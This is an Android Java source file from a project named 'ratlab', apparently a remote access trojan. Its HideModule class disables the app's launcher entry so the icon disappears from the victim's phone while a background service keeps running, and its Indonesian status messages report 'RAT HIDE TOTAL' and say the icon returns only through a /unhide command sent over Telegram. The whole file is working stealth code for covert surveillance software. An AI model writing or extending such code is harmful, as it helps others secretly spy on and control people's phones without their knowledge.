package com.ratlab;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

public class HideModule {

    private final Context ctx;

    public HideModule(Context ctx) {
        this.ctx = ctx;
    }

    public String hide() {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName cn = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            return "RAT HIDE TOTAL.\n"
                    + "- Service: Jalan\n"
                    + "- Icon: Gak ada di app drawer\n"
                    + "- Buka app: cuma via ADB\n\n"
                    + "Kirim /unhide via Telegram untuk munculin lagi.";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String unhide() {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName cn = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(cn,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
            return "Icon dimunculkan lagi. Cek app drawer HP kedua.";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
